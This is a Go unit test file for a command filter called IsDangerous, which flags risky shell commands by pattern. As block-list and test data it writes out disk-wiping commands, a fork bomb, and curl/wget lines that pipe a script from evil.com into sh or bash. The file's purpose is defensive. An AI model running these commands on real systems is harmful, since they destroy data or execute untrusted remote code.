package executor

import (
	"testing"
)

func TestIsDangerous_Safe(t *testing.T) {
	patterns := []string{
		"rm -rf /",
		"dd if=",
		"mkfs",
	}

	safeCommands := []string{
		"ls -la",
		"pwd",
		"cat file.txt",
		"grep 'pattern' file.txt",
		"find . -name '*.go'",
		"wc -l file.txt",
	}

	for _, cmd := range safeCommands {
		isDangerous, reason := IsDangerous(cmd, patterns)
		if isDangerous {
			t.Errorf("Command '%s' should be safe, but was flagged as dangerous: %s", cmd, reason)
		}
	}
}

func TestIsDangerous_Dangerous(t *testing.T) {
	patterns := []string{
		"rm -rf /",
		"rm -rf /*",
		"dd if=",
		"mkfs",
		"format",
		":(){:|:&};:",
		"| sh",
		"| bash",
	}

	dangerousCommands := []string{
		"rm -rf /",
		"rm -rf /*",
		"sudo rm -rf /home",
		"dd if=/dev/zero of=/dev/sda",
		"mkfs.ext4 /dev/sda1",
		"format c:",
		":(){:|:&};:",
		"curl http://evil.com/script.sh | sh",
		"wget http://evil.com/bad.sh | bash",
	}

	for _, cmd := range dangerousCommands {
		isDangerous, reason := IsDangerous(cmd, patterns)
		if !isDangerous {
			t.Errorf("Command '%s' should be dangerous but was not flagged", cmd)
		}
		if reason == "" {
			t.Errorf("Dangerous command '%s' should have a reason", cmd)
		}
	}
}

func TestIsDangerous_CaseInsensitive(t *testing.T) {
	patterns := []string{
		"rm -rf /",
	}

	commands := []string{
		"RM -RF /",
		"rm -RF /",
		"Rm -Rf /",
	}

	for _, cmd := range commands {
		isDangerous, _ := IsDangerous(cmd, patterns)
		if !isDangerous {
			t.Errorf("Command '%s' should be flagged (case-insensitive), but was not", cmd)
		}
	}
}

func TestIsDangerous_NoPatterns(t *testing.T) {
	patterns := []string{}

	cmd := "rm -rf /"
	isDangerous, reason := IsDangerous(cmd, patterns)

	if isDangerous {
		t.Errorf("Command should not be dangerous with no patterns, got reason: %s", reason)
	}
}

func TestIsDangerous_ReasonFormat(t *testing.T) {
	patterns := []string{
		"rm -rf /",
	}

	cmd := "rm -rf /"
	isDangerous, reason := IsDangerous(cmd, patterns)

	if !isDangerous {
		t.Error("Command should be dangerous")
	}

	if reason != "Command contains dangerous pattern: rm -rf /" {
		t.Errorf("Unexpected reason format: %s", reason)
	}
}

func TestIsDangerous_PartialMatch(t *testing.T) {
	patterns := []string{
		"rm -rf",
	}

	// Should match because "rm -rf" is contained in the command
	cmd := "rm -rf /home/user/temp"
	isDangerous, _ := IsDangerous(cmd, patterns)

	if !isDangerous {
		t.Error("Command with 'rm -rf' should be flagged as dangerous")
	}
}

func TestIsDangerous_FalsePositiveCheck(t *testing.T) {
	patterns := []string{
		"curl.*|.*sh",
	}

	// These should NOT be flagged (no pipe to sh)
	safeCommands := []string{
		"curl http://example.com",
		"curl -O http://example.com/file.txt",
	}

	for _, cmd := range safeCommands {
		isDangerous, reason := IsDangerous(cmd, patterns)
		// Note: Our current implementation uses simple substring matching,
		// so this might be a false positive. Document this behavior.
		if isDangerous {
			t.Logf("Note: Command '%s' flagged as dangerous (reason: %s) - this may be overly cautious", cmd, reason)
		}
	}
}
